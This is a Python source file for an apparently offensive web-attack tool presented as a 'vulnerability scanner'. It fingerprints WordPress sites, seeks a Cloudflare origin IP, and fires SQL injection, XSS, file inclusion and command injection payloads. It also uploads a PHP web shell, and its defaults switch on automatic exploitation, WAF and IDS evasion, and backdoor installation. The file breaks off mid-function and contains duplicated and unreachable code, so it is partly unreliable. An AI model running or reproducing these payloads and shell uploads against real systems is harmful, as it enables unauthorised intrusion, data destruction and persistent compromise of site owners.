#!/usr/bin/env python3
"""
Advanced Professional Vulnerability Scanner v3.0
Multi-threaded, Feature-rich Security Testing Framework
"""

import requests
import re
import socket
import json
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs, quote
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import base64
import random
import sys

init(autoreset=True)

class AdvancedScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.domain = urlparse(target_url).netloc
        self.vulnerabilities = []
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents)
        })
        self.threads = 10
        self.timeout = 10
        self.subdomains = []
        self.technologies = []
        self.open_ports = []
        self.origin_ip = None
        self.wp_version = None
        self.wp_plugins = []
        self.wp_themes = []
        self.use_proxy = False
        self.proxy_list = []
        
        # Global Configuration
        self.config = {
            'auto_exploit': True,
            'brute_force_mode': 'full',  # 'full', 'smart', 'quick'
            'use_custom_wordlist': False,
            'username_wordlist': None,
            'password_wordlist': None,
            'sql_attack_mode': 'all',  # 'bypass', 'dump', 'extract', 'shell', 'all'
            'continue_on_success': True,
            'save_results': True,
            'verbose': True,
            'stealth_mode': False,
            'waf_bypass': True,
            'use_ai_payloads': True,
            'post_exploitation': True,
            'obfuscation_level': 'medium'  # 'none', 'low', 'medium', 'high'
        }
        
        # Advanced Features
        self.exploited_urls = []
        self.compromised_credentials = []
        self.uploaded_shells = []
        self.session_tokens = {}
        
    def configure_global_settings(self):
        """Configure global exploitation settings once"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          GLOBAL CONFIGURATION                              ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        """Configure global exploitation settings once"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          GLOBAL CONFIGURATION                              ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}[*] Configure settings once - will apply to all exploits\n")
        
        # Brute Force Configuration
        print(f"{Fore.CYAN}[1] Brute Force Configuration:")
        print(f"{Fore.GREEN}    [1] Full Attack (test all combinations)")
        print(f"{Fore.GREEN}    [2] Smart Mode (limit 5000 attempts)")
        print(f"{Fore.GREEN}    [3] Quick Mode (limit 1000 attempts)")
        print(f"{Fore.GREEN}    [4] Skip brute force attacks")
        
        bf_choice = input(f"\n{Fore.YELLOW}Brute Force Mode [1-4] (default: 2): ").strip() or '2'
        
        if bf_choice == '1':
            self.config['brute_force_mode'] = 'full'
        elif bf_choice == '2':
            self.config['brute_force_mode'] = 'smart'
        elif bf_choice == '3':
            self.config['brute_force_mode'] = 'quick'
        elif bf_choice == '4':
            self.config['brute_force_mode'] = 'skip'
        
        # Wordlist Configuration
        if self.config['brute_force_mode'] != 'skip':
            print(f"\n{Fore.CYAN}[2] Wordlist Configuration:")
            print(f"{Fore.GREEN}    [1] Use default wordlists")
            print(f"{Fore.GREEN}    [2] Use custom wordlists")
            
            wl_choice = input(f"\n{Fore.YELLOW}Wordlist Mode [1-2] (default: 1): ").strip() or '1'
            
            if wl_choice == '2':
                self.config['use_custom_wordlist'] = True
                
                print(f"\n{Fore.YELLOW}[*] Enter custom wordlist paths:")
                user_file = input(f"{Fore.CYAN}Username list (or press Enter to skip): ").strip()
                pass_file = input(f"{Fore.CYAN}Password list (or press Enter to skip): ").strip()
                
                if user_file:
                    self.config['username_wordlist'] = user_file
                if pass_file:
                    self.config['password_wordlist'] = pass_file
        
        # SQL Injection Configuration
        print(f"\n{Fore.CYAN}[3] SQL Injection Attack Mode:")
        print(f"{Fore.GREEN}    [1] Authentication Bypass only")
        print(f"{Fore.GREEN}    [2] Database Dump only")
        print(f"{Fore.GREEN}    [3] Password Extraction only")
        print(f"{Fore.GREEN}    [4] Shell Upload only")
        print(f"{Fore.GREEN}    [5] All attacks (recommended)")
        
        sql_choice = input(f"\n{Fore.YELLOW}SQL Attack Mode [1-5] (default: 5): ").strip() or '5'
        
        sql_modes = {
            '1': 'bypass',
            '2': 'dump',
            '3': 'extract',
            '4': 'shell',
            '5': 'all'
        }
        self.config['sql_attack_mode'] = sql_modes.get(sql_choice, 'all')
        
        # Continuation Configuration
        print(f"\n{Fore.CYAN}[4] Exploitation Behavior:")
        print(f"{Fore.GREEN}    [1] Continue to next vuln after success")
        print(f"{Fore.GREEN}    [2] Stop after first successful exploit")
        
        cont_choice = input(f"\n{Fore.YELLOW}Continue Mode [1-2] (default: 1): ").strip() or '1'
        self.config['continue_on_success'] = (cont_choice == '1')
        
        # Auto-save Configuration
        print(f"\n{Fore.CYAN}[5] Auto-save Results:")
        print(f"{Fore.GREEN}    [1] Yes - Save all results automatically")
        print(f"{Fore.GREEN}    [2] No - Ask before saving")
        
        save_choice = input(f"\n{Fore.YELLOW}Auto-save [1-2] (default: 1): ").strip() or '1'
        self.config['save_results'] = (save_choice == '1')
        
        # Advanced Features
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          ADVANCED FEATURES                                 ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝")
        
        # Stealth Mode
        print(f"\n{Fore.CYAN}[6] Stealth Mode (Evade IDS/IPS):")
        print(f"{Fore.GREEN}    [1] Yes - Random delays, UA rotation, slow scan")
        print(f"{Fore.GREEN}    [2] No - Fast aggressive scan")
        
        stealth = input(f"\n{Fore.YELLOW}Stealth Mode [1-2] (default: 2): ").strip() or '2'
        self.config['stealth_mode'] = (stealth == '1')
        
        # WAF Bypass
        print(f"\n{Fore.CYAN}[7] WAF Bypass Techniques:")
        print(f"{Fore.GREEN}    [1] Yes - Use advanced evasion")
        print(f"{Fore.GREEN}    [2] No - Standard payloads")
        
        waf = input(f"\n{Fore.YELLOW}WAF Bypass [1-2] (default: 1): ").strip() or '1'
        self.config['waf_bypass'] = (waf == '1')
        
        # AI Payloads
        print(f"\n{Fore.CYAN}[8] AI-Powered Payload Generation:")
        print(f"{Fore.GREEN}    [1] Yes - Smart payload mutations")
        print(f"{Fore.GREEN}    [2] No - Standard payloads only")
        
        ai = input(f"\n{Fore.YELLOW}AI Payloads [1-2] (default: 1): ").strip() or '1'
        self.config['use_ai_payloads'] = (ai == '1')
        
        # Obfuscation Level
        print(f"\n{Fore.CYAN}[9] Payload Obfuscation Level:")
        print(f"{Fore.GREEN}    [1] None - Plain payloads")
        print(f"{Fore.GREEN}    [2] Low - Basic encoding")
        print(f"{Fore.GREEN}    [3] Medium - Multiple encoding layers")
        print(f"{Fore.GREEN}    [4] High - Advanced obfuscation")
        
        obf = input(f"\n{Fore.YELLOW}Obfuscation [1-4] (default: 3): ").strip() or '3'
        obf_levels = {'1': 'none', '2': 'low', '3': 'medium', '4': 'high'}
        self.config['obfuscation_level'] = obf_levels.get(obf, 'medium')
        
        # Post-Exploitation
        print(f"\n{Fore.CYAN}[10] Post-Exploitation Actions:")
        print(f"{Fore.GREEN}    [1] Yes - Enumerate system, install backdoor")
        print(f"{Fore.GREEN}    [2] No - Stop after initial access")
        
        post = input(f"\n{Fore.YELLOW}Post-Exploitation [1-2] (default: 1): ").strip() or '1'
        self.config['post_exploitation'] = (post == '1')
        
        # Summary
        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║          CONFIGURATION SUMMARY                             ║")
        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.CYAN}Brute Force Mode: {Fore.YELLOW}{self.config['brute_force_mode'].upper()}")
        print(f"{Fore.CYAN}Custom Wordlists: {Fore.YELLOW}{'YES' if self.config['use_custom_wordlist'] else 'NO'}")
        if self.config['username_wordlist']:
            print(f"{Fore.CYAN}  Username List: {Fore.YELLOW}{self.config['username_wordlist']}")
        if self.config['password_wordlist']:
            print(f"{Fore.CYAN}  Password List: {Fore.YELLOW}{self.config['password_wordlist']}")
        print(f"{Fore.CYAN}SQL Attack Mode: {Fore.YELLOW}{self.config['sql_attack_mode'].upper()}")
        print(f"{Fore.CYAN}Continue After Success: {Fore.YELLOW}{'YES' if self.config['continue_on_success'] else 'NO'}")
        print(f"{Fore.CYAN}Auto-save Results: {Fore.YELLOW}{'YES' if self.config['save_results'] else 'NO'}")
        print(f"{Fore.CYAN}Stealth Mode: {Fore.YELLOW}{'YES' if self.config['stealth_mode'] else 'NO'}")
        print(f"{Fore.CYAN}WAF Bypass: {Fore.YELLOW}{'YES' if self.config['waf_bypass'] else 'NO'}")
        print(f"{Fore.CYAN}AI Payloads: {Fore.YELLOW}{'YES' if self.config['use_ai_payloads'] else 'NO'}")
        print(f"{Fore.CYAN}Obfuscation Level: {Fore.YELLOW}{self.config['obfuscation_level'].upper()}")
        print(f"{Fore.CYAN}Post-Exploitation: {Fore.YELLOW}{'YES' if self.config['post_exploitation'] else 'NO'}\n")
        
        confirm = input(f"{Fore.YELLOW}Proceed with this configuration? (y/n): ").strip().lower()
        if confirm != 'y':
            return False
        
        return True
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗     ║
║    ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝     ║
║    ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║          ║
║    ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║          ║
║    ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗     ║
║    ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ║
║                                                              ║
║    Professional Vulnerability Scanner v3.0                  ║
║    Target: {self.target[:40]:<40} ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(banner)
    
    def detect_waf(self):
        """Detect Web Application Firewall"""
        print(f"\n{Fore.YELLOW}[*] Detecting WAF/Security Solutions...")
        
        waf_signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn', 'awselb'],
            'Akamai': ['akamai'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'Imperva': ['incap_ses', 'visid_incap'],
            'ModSecurity': ['mod_security', 'NOYB']
        }
        
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            headers = str(resp.headers).lower()
            content = resp.text.lower()
            
            for waf, signatures in waf_signatures.items():
                if any(sig in headers or sig in content for sig in signatures):
                    print(f"{Fore.RED}[!] WAF Detected: {waf}")
                    return waf
            
            print(f"{Fore.GREEN}[+] No WAF detected")
            return None
        except:
            return None
    
    def detect_technology(self):
        """Detect technologies used"""
        print(f"\n{Fore.YELLOW}[*] Detecting Technologies...")
        
        tech_patterns = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json'],
            'Joomla': ['joomla', '/components/com_'],
            'Drupal': ['drupal', '/sites/default/'],
            'Laravel': ['laravel_session', 'XSRF-TOKEN'],
            'Django': ['csrftoken', '__admin'],
            'PHP': ['.php', 'PHPSESSID'],
            'ASP.NET': ['.aspx', 'ASP.NET_SessionId'],
            'Node.js': ['express', 'connect.sid'],
            'React': ['react', '__REACT'],
            'Vue.js': ['vue', '__VUE'],
            'jQuery': ['jquery'],
            'Bootstrap': ['bootstrap']
        }
        
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            content = resp.text.lower()
            headers = str(resp.headers).lower()
            
            for tech, patterns in tech_patterns.items():
                if any(pattern in content or pattern in headers for pattern in patterns):
                    self.technologies.append(tech)
                    print(f"{Fore.GREEN}[+] Technology: {tech}")
                    
                    # If WordPress, get version and enumerate plugins
                    if tech == 'WordPress':
                        self.enumerate_wordpress()
        except:
            pass
    
    def enumerate_wordpress(self):
        """WordPress enumeration"""
        print(f"\n{Fore.CYAN}[*] WordPress Enumeration Started...")
        
        # Detect WordPress version
        try:
            # Check readme.html
            readme_url = urljoin(self.target, '/readme.html')
            resp = self.session.get(readme_url, timeout=5)
            if resp.status_code == 200:
                version_match = re.search(r'Version\s+([\d.]+)', resp.text)
                if version_match:
                    self.wp_version = version_match.group(1)
                    print(f"{Fore.GREEN}[+] WordPress Version: {self.wp_version}")
        except:
            pass
        
        # Check meta generator
        try:
            resp = self.session.get(self.target, timeout=5)
            version_match = re.search(r'WordPress\s+([\d.]+)', resp.text)
            if version_match and not self.wp_version:
                self.wp_version = version_match.group(1)
                print(f"{Fore.GREEN}[+] WordPress Version: {self.wp_version}")
        except:
            pass
        
        # Enumerate plugins
        print(f"{Fore.YELLOW}[*] Enumerating plugins...")
        common_plugins = [
            'akismet', 'jetpack', 'wordfence', 'yoast', 'contact-form-7',
            'elementor', 'wpforms', 'wp-super-cache', 'all-in-one-seo-pack',
            'google-analytics', 'woocommerce', 'duplicator', 'updraftplus'
        ]
        
        for plugin in common_plugins:
            plugin_url = urljoin(self.target, f'/wp-content/plugins/{plugin}/')
            try:
                resp = self.session.get(plugin_url, timeout=3)
                if resp.status_code in [200, 403]:
                    self.wp_plugins.append(plugin)
                    print(f"{Fore.GREEN}[+] Plugin found: {plugin}")
                    
                    # Check for readme
                    readme_url = urljoin(plugin_url, 'readme.txt')
                    try:
                        readme_resp = self.session.get(readme_url, timeout=3)
                        if readme_resp.status_code == 200:
                            version_match = re.search(r'Stable tag:\s*([\d.]+)', readme_resp.text)
                            if version_match:
                                print(f"{Fore.CYAN}    Version: {version_match.group(1)}")
                    except:
                        pass
            except:
                pass
        
        # Enumerate themes
        print(f"{Fore.YELLOW}[*] Enumerating themes...")
        common_themes = [
            'twentytwentyfour', 'twentytwentythree', 'twentytwentytwo',
            'astra', 'generatepress', 'oceanwp', 'neve', 'kadence'
        ]
        
        for theme in common_themes:
            theme_url = urljoin(self.target, f'/wp-content/themes/{theme}/')
            try:
                resp = self.session.get(theme_url, timeout=3)
                if resp.status_code in [200, 403]:
                    self.wp_themes.append(theme)
                    print(f"{Fore.GREEN}[+] Theme found: {theme}")
            except:
                pass
        
        # Check XML-RPC
        self.test_xmlrpc()
        
        # Check wp-config.php exposure
        self.check_wp_config()
        
        # Test WP REST API
        self.test_wp_rest_api()
    
    def test_xmlrpc(self):
        """Test XML-RPC vulnerability"""
        print(f"\n{Fore.YELLOW}[*] Testing XML-RPC...")
        
        xmlrpc_url = urljoin(self.target, '/xmlrpc.php')
        try:
            resp = self.session.get(xmlrpc_url, timeout=5)
            if resp.status_code == 200 and 'XML-RPC' in resp.text:
                print(f"{Fore.RED}[!] XML-RPC is enabled")
                
                vuln = {
                    'type': 'XML-RPC Enabled',
                    'severity': 'MEDIUM',
                    'url': xmlrpc_url,
                    'description': 'XML-RPC enabled - can be used for brute force attacks',
                    'exploit': True
                }
                self.vulnerabilities.append(vuln)
                
                # Test for pingback
                pingback_payload = '''<?xml version="1.0" encoding="UTF-8"?>
                <methodCall>
                    <methodName>pingback.ping</methodName>
                    <params>
                        <param><value><string>http://example.com/</string></value></param>
                        <param><value><string>{}</string></value></param>
                    </params>
                </methodCall>'''.format(self.target)
                
                try:
                    resp = self.session.post(xmlrpc_url, data=pingback_payload, timeout=5)
                    if 'faultCode' not in resp.text or resp.status_code == 200:
                        print(f"{Fore.RED}[!] XML-RPC Pingback enabled (SSRF risk)")
                except:
                    pass
            else:
                print(f"{Fore.GREEN}[+] XML-RPC is disabled")
        except:
            pass
    
    def check_wp_config(self):
        """Check for wp-config.php exposure"""
        print(f"\n{Fore.YELLOW}[*] Checking wp-config.php exposure...")
        
        config_paths = [
            '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.save',
            '/wp-config.php~', '/wp-config.php.old', '/.wp-config.php.swp',
            '/wp-config.txt', '/wp-config.php.txt'
        ]
        
        for path in config_paths:
            url = urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and ('DB_NAME' in resp.text or 'DB_PASSWORD' in resp.text):
                    vuln = {
                        'type': 'wp-config.php Exposed',
                        'severity': 'CRITICAL',
                        'url': url,
                        'description': 'Database credentials exposed in wp-config.php',
                        'exploit': True
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!] CRITICAL: wp-config.php exposed at {path}")
                    return
            except:
                pass
        
        print(f"{Fore.GREEN}[+] wp-config.php is protected")
    
    def test_wp_rest_api(self):
        """Test WordPress REST API"""
        print(f"\n{Fore.YELLOW}[*] Testing WP REST API...")
        
        api_url = urljoin(self.target, '/wp-json/wp/v2/users')
        try:
            resp = self.session.get(api_url, timeout=5)
            if resp.status_code == 200:
                try:
                    users = resp.json()
                    if users:
                        print(f"{Fore.YELLOW}[!] REST API exposes user information")
                        for user in users[:5]:
                            username = user.get('slug', 'unknown')
                            print(f"{Fore.CYAN}    User: {username}")
                        
                        vuln = {
                            'type': 'WordPress User Enumeration',
                            'severity': 'LOW',
                            'url': api_url,
                            'description': f'REST API exposes {len(users)} users',
                            'exploit': False
                        }
                        self.vulnerabilities.append(vuln)
                except:
                    pass
            else:
                print(f"{Fore.GREEN}[+] REST API user enumeration blocked")
        except:
            pass
    
    def find_cloudflare_origin(self):
        """Try to find origin IP behind Cloudflare"""
        print(f"\n{Fore.YELLOW}[*] Attempting to find origin IP (Cloudflare bypass)...")
        
        # Method 1: Check DNS history
        print(f"{Fore.CYAN}[*] Checking subdomain for origin IP...")
        subdomains = ['direct', 'origin', 'direct-connect', 'cpanel', 'mail', 'ftp']
        
        for sub in subdomains:
            try:
                subdomain = f"{sub}.{self.domain}"
                ip = socket.gethostbyname(subdomain)
                
                # Check if it's not Cloudflare IP
                resp = self.session.get(f"http://{ip}", timeout=5, headers={'Host': self.domain})
                if 'cloudflare' not in resp.text.lower():
                    self.origin_ip = ip
                    print(f"{Fore.GREEN}[+] Possible origin IP found: {ip}")
                    return ip
            except:
                pass
        
        # Method 2: Check common ports
        try:
            ip = socket.gethostbyname(self.domain)
            print(f"{Fore.CYAN}[*] Testing direct IP connection: {ip}")
            
            # Try different ports
            for port in [8080, 8443, 2082, 2083, 2086, 2087]:
                try:
                    test_url = f"http://{ip}:{port}"
                    resp = self.session.get(test_url, timeout=5)
                    if resp.status_code == 200:
                        print(f"{Fore.GREEN}[+] Direct access possible: {test_url}")
                        self.origin_ip = ip
                        return ip
                except:
                    pass
        except:
            pass
        
        print(f"{Fore.YELLOW}[-] Could not find origin IP")
        return None
    
    def scan_ports(self):
        """Scan common ports"""
        print(f"\n{Fore.YELLOW}[*] Scanning Ports...")
        
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5432, 8080, 8443]
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.domain, port))
                sock.close()
                if result == 0:
                    self.open_ports.append(port)
                    print(f"{Fore.GREEN}[+] Port {port} is OPEN")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_port, common_ports)
    
    def find_subdomains(self):
        """Find subdomains"""
        print(f"\n{Fore.YELLOW}[*] Enumerating Subdomains...")
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test', 'api',
            'cdn', 'shop', 'store', 'portal', 'app', 'mobile', 'staging',
            'beta', 'demo', 'support', 'help', 'forum', 'vpn', 'ns1', 'ns2'
        ]
        
        def check_subdomain(sub):
            subdomain = f"{sub}.{self.domain}"
            try:
                socket.gethostbyname(subdomain)
                url = f"http://{subdomain}"
                resp = self.session.get(url, timeout=3)
                if resp.status_code == 200:
                    self.subdomains.append(subdomain)
                    print(f"{Fore.GREEN}[+] Subdomain found: {subdomain}")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_subdomain, common_subdomains)
    
    def crawl_site(self, max_pages=100):
        """Advanced crawling with multi-threading"""
        print(f"\n{Fore.YELLOW}[*] Crawling website (max {max_pages} pages)...")
        visited = set()
        to_visit = [self.target]
        forms = []
        lock = threading.Lock()
        
        def crawl_url(url):
            if url in visited:
                return
            
            try:
                resp = self.session.get(url, timeout=self.timeout)
                with lock:
                    visited.add(url)
                    
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Find links
                for link in soup.find_all('a', href=True):
                    full_url = urljoin(url, link['href'])
                    if urlparse(full_url).netloc == urlparse(self.target).netloc:
                        if full_url not in visited and len(visited) < max_pages:
                            to_visit.append(full_url)
                
                # Find forms
                for form in soup.find_all('form'):
                    forms.append({'url': url, 'form': form})
                
                print(f"{Fore.GREEN}[+] Crawled: {url}")
            except:
                pass
        
        while to_visit and len(visited) < max_pages:
            batch = to_visit[:self.threads]
            to_visit = to_visit[self.threads:]
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                executor.map(crawl_url, batch)
        
        print(f"{Fore.CYAN}[*] Total pages: {len(visited)}, Forms: {len(forms)}")
        return list(visited), forms
    
    def test_sql_injection(self, urls):
        """Advanced SQL injection testing"""
        print(f"\n{Fore.YELLOW}[*] Testing SQL Injection (Advanced)...")
        
        base_payloads = [
            # Error-based
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "admin' --", "admin' #", "admin'/*", 
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            # Time-based
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
            # Boolean-based
            "' AND '1'='1", "' AND '1'='2",
            # Stacked queries
            "'; DROP TABLE users--", "'; EXEC sp_MSForEachTable--"
        ]
        
        sql_errors = [
            'sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
            'odbc', 'jdbc', 'syntax error', 'unclosed quotation',
            'quoted string not properly terminated', 'ora-'
        ]
        
        def test_url(url):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                # Generate smart payloads
                all_payloads = []
                for base_payload in base_payloads:
                    # Apply AI mutations
                    if self.config['use_ai_payloads']:
                        all_payloads.extend(self.generate_ai_payloads(base_payload, 'SQL Injection'))
                    else:
                        all_payloads.append(base_payload)
                    
                    # Apply WAF bypass
                    if self.config['waf_bypass']:
                        all_payloads.extend(self.bypass_waf_techniques(base_payload))
                    
                    # Apply obfuscation
                    if self.config['obfuscation_level'] != 'none':
                        all_payloads.extend(self.obfuscate_payload(base_payload))
                
                # Remove duplicates
                all_payloads = list(set(all_payloads))
                
                for payload in all_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={quote(payload)}")
                    try:
                        # Apply stealth delays
                        if self.config['stealth_mode']:
                            self.apply_stealth_delays()
                        
                        start_time = time.time()
                        resp = self.session.get(test_url, timeout=self.timeout)
                        elapsed = time.time() - start_time
                        
                        # Check for errors
                        if any(err in resp.text.lower() for err in sql_errors):
                            vuln = {
                                'type': 'SQL Injection (Error-based)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'description': 'SQL injection vulnerability detected via error messages',
                                'exploit': True
                            }
                            self.vulnerabilities.append(vuln)
                            self.exploited_urls.append(test_url)
                            print(f"{Fore.RED}[!] SQL Injection: {url} (param: {param})")
                            return
                        
                        # Check for time-based
                        if 'SLEEP' in payload or 'WAITFOR' in payload:
                            if elapsed > 4:
                                vuln = {
                                    'type': 'SQL Injection (Time-based)',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'description': f'Time-based blind SQL injection ({elapsed:.2f}s delay)',
                                    'exploit': True
                                }
                                self.vulnerabilities.append(vuln)
                                self.exploited_urls.append(test_url)
                                print(f"{Fore.RED}[!] Time-based SQLi: {url}")
                                return
                    except:
                        pass
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(test_url, urls)
    
    def test_xss(self, forms):
        """Advanced XSS testing"""
        print(f"\n{Fore.YELLOW}[*] Testing XSS (All types)...")
        
        payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            # Advanced
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            # Obfuscated
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "'\"><script>alert('XSS')</script>",
            # DOM-based
            "#<script>alert('XSS')</script>"
        ]
        
        for form_data in forms:
            form = form_data['form']
            url = form_data['url']
            action = form.get('action')
            method = form.get('method', 'get').lower()
            target = urljoin(url, action) if action else url
            
            for payload in payloads:
                try:
                    data = {}
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        if name:
                            data[name] = payload
                    
                    if method == 'post':
                        resp = self.session.post(target, data=data, timeout=self.timeout)
                    else:
                        resp = self.session.get(target, params=data, timeout=self.timeout)
                    
                    if payload in resp.text or payload.replace("'", '"') in resp.text:
                        vuln = {
                            'type': 'XSS (Cross-Site Scripting)',
                            'severity': 'HIGH',
                            'url': target,
                            'payload': payload,
                            'description': 'Reflected XSS vulnerability detected',
                            'exploit': True
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] XSS found: {target}")
                        break
                except:
                    pass
    
    def test_lfi_rfi(self, urls):
        """Test for Local/Remote File Inclusion"""
        print(f"\n{Fore.YELLOW}[*] Testing LFI/RFI...")
        
        lfi_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd", "/etc/passwd",
            "../../../../../../etc/passwd%00"
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt?",
            "https://pastebin.com/raw/test"
        ]
        
        for url in urls[:20]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                # Test LFI
                for payload in lfi_payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={payload}")
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout)
                        if "root:" in resp.text or "[extensions]" in resp.text:
                            vuln = {
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'description': 'LFI vulnerability - can read local files',
                                'exploit': True
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"{Fore.RED}[!] LFI found: {url}")
                            break
                    except:
                        pass
    
    def test_command_injection(self, urls):
        """Test for Command Injection"""
        print(f"\n{Fore.YELLOW}[*] Testing Command Injection...")
        
        payloads = [
            "; ls", "| ls", "& dir", "&& dir",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "`whoami`", "$(whoami)"
        ]
        
        indicators = ['root:', 'bin', 'usr', 'administrator', 'windows']
        
        for url in urls[:20]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", 
                                         f"{param}={quote(payload)}")
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout)
                        if any(ind in resp.text.lower() for ind in indicators):
                            vuln = {
                                'type': 'Command Injection',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'description': 'OS command injection vulnerability',
                                'exploit': True
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"{Fore.RED}[!] Command Injection: {url}")
                            break
                    except:
                        pass
    
    def test_file_upload(self, forms):
        """Test for file upload vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*] Testing File Upload Vulnerabilities...")
        
        # PHP shell payloads
        php_shell = "<?php system($_GET['cmd']); ?>"
        
        for form_data in forms[:10]:
            form = form_data['form']
            url = form_data['url']
            
            # Find file input
            file_inputs = form.find_all('input', {'type': 'file'})
            if not file_inputs:
                continue
            
            print(f"{Fore.CYAN}[*] Testing upload form at: {url}")
            
            action = form.get('action')
            target = urljoin(url, action) if action else url
            method = form.get('method', 'post').lower()
            
            # Try different extensions
            extensions = [
                '.php', '.php5', '.phtml', '.php3', '.php4', '.inc',
                '.pht', '.phar', '.phps', '.php.jpg', '.php.png'
            ]
            
            for ext in extensions:
                try:
                    filename = f"shell{ext}"
                    files = {'file': (filename, php_shell, 'application/x-php')}
                    
                    data = {}
                    for inp in form.find_all('input'):
                        if inp.get('type') != 'file' and inp.get('type') != 'submit':
                            name = inp.get('name')
                            if name:
                                data[name] = inp.get('value', 'test')
                    
                    if method == 'post':
                        resp = self.session.post(target, files=files, data=data, timeout=self.timeout)
                    else:
                        continue
                    
                    if resp.status_code == 200 and 'upload' in resp.text.lower():
                        # Try to find uploaded file
                        upload_paths = [
                            '/uploads/', '/wp-content/uploads/', '/files/',
                            '/images/', '/media/', '/assets/uploads/'
                        ]
                        
                        for path in upload_paths:
                            check_url = urljoin(self.target, path + filename)
                            try:
                                check_resp = self.session.get(check_url, timeout=5)
                                if check_resp.status_code == 200:
                                    vuln = {
                                        'type': 'File Upload Vulnerability',
                                        'severity': 'CRITICAL',
                                        'url': target,
                                        'upload_path': check_url,
                                        'description': f'Unrestricted file upload - shell uploaded at {check_url}',
                                        'exploit': True
                                    }
                                    self.vulnerabilities.append(vuln)
                                    print(f"{Fore.RED}[!] File upload vuln: {check_url}")
                                    return
                            except:
                                pass
                except:
                    pass
    
    def test_open_redirect(self, urls):
